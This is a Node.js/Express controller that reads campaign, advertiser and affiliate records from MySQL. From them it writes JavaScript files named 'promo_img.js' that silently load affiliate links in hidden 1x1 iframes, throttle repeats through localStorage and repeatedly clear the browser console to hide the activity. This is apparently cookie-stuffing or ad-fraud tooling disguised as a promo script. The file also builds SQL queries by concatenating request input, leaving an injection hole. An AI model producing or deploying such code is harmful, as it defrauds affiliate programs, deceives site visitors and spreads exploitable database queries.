const mysql      = require('mysql');
const fs = require('fs');
const path = require('path');
const directory = 'output';
class Database {
  constructor( config ) {
      this.connection = mysql.createConnection( {
        host     : process.env.MYSQL_HOST,
        user     : process.env.MYSQL_USER,
        password : process.env.MYSQL_PASSWORD,
        database : process.env.MYSQL_DATABASE
      } );
  }
  query( sql, args ) {
      return new Promise( ( resolve, reject ) => {
          this.connection.query( sql, args, ( err, rows ) => {
              if ( err )
                  return reject( err );
              resolve( rows );
          } );
      } );
  }
  close() {
      return new Promise( ( resolve, reject ) => {
          this.connection.end( err => {
              if ( err )
                  return reject( err );
              resolve();
          } );
      } );
  }
}
function deleteFiles(){
  // console.log(directory);
  return new Promise(function (fulfill, reject){
    fs.readdir(directory, (err, files) => {
      if (err) reject(err);
      filecount=1;
      for (const file of files) {
        if(file != ".DS_Store")
        {
          var stats = fs.statSync(path.join(directory, file));
          // console.log(files.length);
          if(stats.isFile())
          {
            fs.unlink(path.join(directory, file), err => {
              if (err) reject(err);
              else fulfill(1);
            });
          }
        }
        
        if(filecount == files.length)
        {
          fulfill(1);
        }
        filecount++;
      }
    });
  });
}

function writeFile(filename,content){
  return new Promise(function (fulfill, reject){
   
      fs.writeFile(filename, content, function(err) {
        if (err) reject(err);
        else fulfill(1);
      });
   
  });
}

exports.index = function (req,res) {
  // console.log(req.params.campaign_id);
  database = new Database();
  
  database.query( 'select * from campaign where id='+req.params.campaign_id ).then( rows => {
    if(rows[0].is_country_divided == 0)
        {
          var filename = directory+"/promo_img.js";
          unicountry(rows[0].id,function(resp){
            return new Promise(function (fulfill, reject){
              writeFile(filename, resp).then(function (fname){
                try {
                  fulfill(res.download(filename));
                  
                } catch (ex) {
                  reject(ex);
                }
              }, reject);
            });
          }); 
        }else{     
          var filename = directory+"/promo_img_"; 
         
          database.query("select country from advertisor where active=1 and campaign_id="+rows[0].id+" group by country").then( rows_country => {
            country = rows_country;
          }).then( () => {
            // console.log(country);
            deleteFiles().then(function (dd){  
              for(i=0; i <country.length;i++)
              {
                console.log(country[i].country.toLowerCase());
                multicountry(rows[0].id,country[i].country.toLowerCase(),function(resp){
                  // console.log(resp);
                  for (var country1 in resp) {
                    // console.log(country1);
                    fname = filename+country1+".js";
                  
                    return new Promise(function (fulfill, reject){
                      writeFile(fname, resp[country1]).then(function (resp_no_use){
                        try {
                          req.flash('success', 'File(s) generated successfully Successfully.');
                          fulfill(res.redirect('/campaign'));
                        
                        } catch (ex) {
                          reject(ex);
                        }
                      }, reject);
                    });
                  
                  }

                });
              }
            });
          });
       
      }
  });
}

function multicountry(campaign_id,country,callback)
{
  database = new Database();
  var advertisor = {};
  var affiliate = {};
  
  database.query("select * from advertisor where active=1 and country like '"+country+"' and campaign_id="+campaign_id).then( rows => {
    // advertisor = rows;
    advertisor[country] = rows;    
    var ids= "";
    for(i=0; i <advertisor[country].length;i++)
    {
     ids += advertisor[country][i].adv_id+",";
    }    
    if(ids != "")
    {
      ids = ids.slice(0, -1);
      // console.log("78-"+ids);
      return database.query( "select * from affiliate where adv_id in ("+ids+") order by divisor desc" );
    }
  }).then( rows => {
    // affiliate = rows;
    affiliate[country] = rows;
    // return database.close();
  }, err => {
    return database.close().then( () => { throw err; } )
} )
  .then( () => {
    // console.log("country-"+country);
    // console.log("advertisor-"+JSON.stringify(advertisor));
    // console.log("affiliate-"+JSON.stringify(affiliate));
    generate_js(advertisor[country],affiliate[country],country,function(resp){
     callback(resp);
      // console.log("resp-"+resp);
    });
  } ).catch( err => {
    // handle the error
    console.log(err);
  } );  
}


function unicountry(campaign_id,callback)
{
  database = new Database();
  var generate = "var a = Math.round(new Date().getTime() / 1000);";
  database.query("select * from advertisor where active=1 and campaign_id="+campaign_id).then( rows => {
    advertisor = rows;
    var ids= "";
    for(i=0; i <advertisor.length;i++)
    {
     ids += advertisor[i].adv_id+",";
    }
    
    if(ids != "")
    {
      ids = ids.slice(0, -1);
      // console.log("78-"+ids);
      return database.query( "select * from affiliate where adv_id in ("+ids+") order by divisor desc" );
    }
  }).then( rows => {
    affiliate = rows;
    return database.close();
  }, err => {
    return database.close().then( () => { throw err; } )
} )
  .then( () => {
    // console.log("advertisor-"+JSON.stringify(advertisor));
    // console.log("affiliate-"+JSON.stringify(affiliate));
    generate_js(advertisor,affiliate,false,function(resp){
      callback(resp);
     });
  } ).catch( err => {
    // handle the error
    console.log(err);
  } );  
}



function generate_js(advertisor,affiliate,country,callback ){
  var generate = "var a = Math.round(new Date().getTime() / 1000);";
  generate += 'var e = "";';
      for(i=0; i <advertisor.length;i++)
      {
        generate += "var "+advertisor[i].adv_name.toLowerCase()+"_time =(parseInt(a) + ("+advertisor[i].enabled_time+" * 60 * 60));";
        cookie_custom_name = advertisor[i].adv_name.toLowerCase().replace("a","").replace("e","").replace("o","");

        generate += "if (typeof(localStorage['"+cookie_custom_name+"']) == 'undefined' || localStorage['"+cookie_custom_name+"'] <= a) {";
        generate += " localStorage['"+cookie_custom_name+"'] = "+advertisor[i].adv_name.toLowerCase()+"_time;";
        if(advertisor[i].is_divisor_needed == 0)  //Not dividing in numbers
        {
          for(j=0; j <affiliate.length;j++)
          {
            if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
            {
              generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
            }
          }
       }else{
         generate += "var f = Math.floor(Date.now() / 1000);";
         
         for(j=0,k=0; j <affiliate.length;j++)
         {
           if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
           {
              if(k == 0)
              {
                generate += "if (f % "+affiliate[j].divisor+" == 0) {";
              }else if(affiliate[j].divisor > 1){
                generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
              }else if(affiliate[j].divisor == 1){
                generate += "} else {";
              }
              
              generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
             k++;
           }            
         }
         generate += "}";  
        }
        generate += "}";
      } //End of for loop

      generate += 'if (e != "") {e += "<script>setTimeout(doSomething, 6000);setTimeout(doSomething, 8000);setTimeout(doSomething, 12000);setTimeout(doSomething, 15000);function doSomething() { console.clear();  }	</script>";var g = document.getElementById("hindu-3421").contentWindow.document;g.open();g.write(e);g.close();}';
      if(country)
      {
        var out={};
        out[country] = generate;
        callback(out);
      }else{
        callback(generate);
      }      
}
exports.files_in_output = function(req,res){
  var filename = [];
  // return new Promise(function (fulfill, reject){
    fs.readdir(directory, (err, files) => {
      if (err) reject(err);
      filecount=1;
      for (const file of files) {
        if(file != ".DS_Store")
        {
          var stats = fs.statSync(path.join(directory, file));
          console.log(files.length);
          if(stats.isFile())
          {
            filename.push(directory+"/"+file);
          }
        if(filecount == files.length)
        {
          // console.log(filename);
          res.end(JSON.stringify(filename));
        }
      }
        filecount++;
      
      }
    });
  // });
}